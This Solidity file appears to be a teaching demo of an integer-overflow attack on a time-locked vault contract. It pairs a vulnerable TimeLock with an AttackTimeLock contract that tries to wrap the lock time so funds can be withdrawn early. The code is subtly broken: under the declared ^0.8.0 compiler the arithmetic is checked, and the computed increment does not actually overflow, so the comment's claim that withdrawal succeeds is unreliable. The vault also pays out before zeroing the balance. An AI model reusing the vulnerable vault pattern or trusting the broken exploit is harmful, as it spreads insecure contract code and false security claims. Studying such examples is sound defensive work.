// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.0;
import "hardhat/console.sol";

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseTimeLock(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expire");

        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Fail to send Ether");
        balances[msg.sender] = 0;
    }
}

contract AttackTimeLock {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        uint256 time = type(uint256).max - timeLock.lockTime(address(this));
        console.log("Trying to send %s tokens to", time);
        timeLock.increaseTimeLock(time);
        timeLock.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
